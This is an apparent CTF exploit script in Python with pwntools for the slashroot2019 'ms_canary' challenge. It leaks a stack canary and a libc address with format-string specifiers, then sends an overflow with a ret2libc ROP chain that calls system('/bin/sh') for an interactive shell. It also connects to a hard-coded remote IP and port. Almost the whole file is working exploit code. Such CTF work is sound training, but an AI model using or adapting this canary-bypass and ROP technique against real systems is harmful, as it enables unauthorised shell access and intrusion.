#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info")
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/slashroot2019/pwn/ms_canary/canary")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def un64(data):
    return int(data[::-1].encode("hex"),16)


def exploit(r):
    # server
    #r.close()
    #r = process("/home/tripoloski/code/ctf/slashroot2019/pwn/ms_canary/canary",env={"LD_PRELOAD":"./libc6-amd64_2.28-0ubuntu1_i386.so"})
    attach(r)
    offset___libc_start_main_ret = 0x2409b
    offset_system = 0x0000000000044cb0
    offset_dup2 = 0x00000000000eaee0
    offset_read = 0x00000000000ea740
    offset_write = 0x00000000000ea7e0
    offset_str_bin_sh = 0x181540

    pop_rdi = 0x00000000004008b3
    ret = 0x00000000004005d9

    off_ov_canary = 'a' * (112-8)
    off_format_str = 8
    off_format_canry = "%21$p"
    off_libc_start_main = "%25$p"
    p = "c:" + off_format_canry + "l:" + off_libc_start_main
    
    r.sendline(p)
    r.recvuntil("c:")
    canary = int(r.recv(18),16)
    r.recvuntil("l:")
    libc_start_main_231 = int(r.recv(14),16) - 231
    log.info("canary : " + hex(canary) )
    log.info("libc_start_main_231 : " + hex(libc_start_main_231))

    # local = 
    #libc = ELF("./libc6-amd64_2.28-0ubuntu1_i386.so")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc_base = libc_start_main_231 - libc.symbols['__libc_start_main']
    libc_system = libc_base + libc.symbols['system']
    binsh     = libc_base + libc.search("/bin/sh").next()


    log.info("libc_base : " + hex(libc_base))
    log.info("libc_system : " + hex(libc_system))
    log.info("binsh : " + hex(binsh))
    q = off_ov_canary
    q += p64(canary)
    q += "XXXXXXXX"
    q += p64(ret)
    q += p64(pop_rdi)
    q += p64(binsh)
    q += p64(libc_system)
    q += p64(libc_system)
    r.sendline(q)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("103.200.7.150", 50600)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
